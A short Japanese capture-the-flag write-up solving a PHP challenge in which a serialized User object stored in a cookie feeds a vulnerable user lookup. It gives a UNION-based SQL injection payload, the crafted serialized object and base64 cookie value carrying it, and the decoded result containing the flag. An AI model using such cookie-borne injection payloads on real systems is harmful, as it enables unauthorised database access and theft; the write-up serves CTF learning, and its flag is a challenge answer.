## 解法

配布されたPHPファイルを見ると、`serialize()` 及び `unserialize()` が利用されているのがわかる。
また、古いfindUserByNameに脆弱性があるのがわかる。

従って下記のSQLを組み立てたい。

```sql
SELECT * FROM users WHERE id = '' UNION SELECT 'hoge', body, '$2y$10$M3nd1TCCZiboAl9YNpH2VufdHxNpJy5hqwP601is26bEEL1oM0Vc6' FROM flags -- 
```

```plaintext
' UNION SELECT 'hoge', body, '$2y$10$M3nd1TCCZiboAl9YNpH2VufdHxNpJy5hqwP601is26bEEL1oM0Vc6' FROM flags -- 
```

Cookieに埋め込む値

```plaintext
O:4:"User":3:{s:2:"id";s:1:"1";s:4:"name";s:106:"' UNION SELECT 'hoge', body, '$2y$10$M3nd1TCCZiboAl9YNpH2VufdHxNpJy5hqwP601is26bEEL1oM0Vc6' FROM flags -- ";s:13:"password_hash";s:60:"$2y$10$M3nd1TCCZiboAl9YNpH2VufdHxNpJy5hqwP601is26bEEL1oM0Vc6";}
```

をbase64 encodeした

```plaintext
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjE6IjEiO3M6NDoibmFtZSI7czoxMDY6IicgVU5JT04gU0VMRUNUICdob2dlJywgYm9keSwgJyQyeSQxMCRNM25kMVRDQ1ppYm9BbDlZTnBIMlZ1ZmRIeE5wSnk1aHF3UDYwMWlzMjZiRUVMMW9NMFZjNicgRlJPTSBmbGFncyAtLSAiO3M6MTM6InBhc3N3b3JkX2hhc2giO3M6NjA6IiQyeSQxMCRNM25kMVRDQ1ppYm9BbDlZTnBIMlZ1ZmRIeE5wSnk1aHF3UDYwMWlzMjZiRUVMMW9NMFZjNiI7fQ==
```

Reloadすると下記のCookieに変わっている

```plaintext
Tzo0OiJVc2VyIjozOntzOjI6ImlkIjtzOjQ6ImhvZ2UiO3M6NDoibmFtZSI7czo0MzoiY3RmNGJ7U2VyMTRsaXo0dDEwbl8xNV92MXJ0dWFsbHlfcGw0MW50ZXh0fSI7czoxMzoicGFzc3dvcmRfaGFzaCI7czo2MDoiJDJ5JDEwJE0zbmQxVENDWmlib0FsOVlOcEgyVnVmZEh4TnBKeTVocXdQNjAxaXMyNmJFRUwxb00wVmM2Ijt9
```

URL Decode & Base64 decode 

```
O:4:"User":3:{s:2:"id";s:4:"hoge";s:4:"name";s:43:"ctf4b{Ser14liz4t10n_15_v1rtually_pl41ntext}";s:13:"password_hash";s:60:"$2y$10$M3nd1TCCZiboAl9YNpH2VufdHxNpJy5hqwP601is26bEEL1oM0Vc6";}
```

## ctf4b{Ser14liz4t10n_15_v1rtually_pl41ntext}
